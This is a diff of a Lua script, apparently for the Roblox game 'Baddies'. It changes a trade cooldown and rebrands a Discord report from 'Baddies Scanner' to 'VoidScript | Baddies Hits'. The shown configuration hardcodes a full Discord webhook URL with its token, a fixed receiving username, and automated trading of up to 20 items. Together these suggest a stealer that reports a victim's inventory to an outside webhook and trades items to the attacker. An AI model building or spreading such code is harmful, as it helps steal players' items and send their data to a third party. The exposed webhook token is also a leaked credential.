@@ -2,7 +2,7 @@
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1493322934532702261/heWYGm0D9zq8kiDoReF5eZEFiDdpDx9wuwZipmUygAbHIC4fJ5_43TJp2dN_n-iLNOxh"
 local RECEIVER = "Luckyman7778910"
 local ENABLE_TRADE = true
-local TRADE_INVITE_COOLDOWN = 2
+local TRADE_INVITE_COOLDOWN = 3
 local TRADE_ADD_DELAY = 0
 local TRADE_MODIFY_BUFFER = 0.03
 local TRADE_MAX_ITEMS = 20
@@ -738,12 +738,12 @@ local function buildDiscordPayload(results, meta)
         username = "Baddies Scanner",
         embeds = {
             {
-                title = "💅 Baddies Item Skins Scan",
+                title = "💅 VoidScript | Baddies ",
                 description = description,
                 color = 0xF1C40F,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                 footer = {
-                    text = "Baddies Scanner - " .. os.date("%d/%m/%Y %H:%M"),
+                    text = "VoidScript | Baddies Hits - " .. os.date("%d/%m/%Y %H:%M"),
                 },
             },
         },
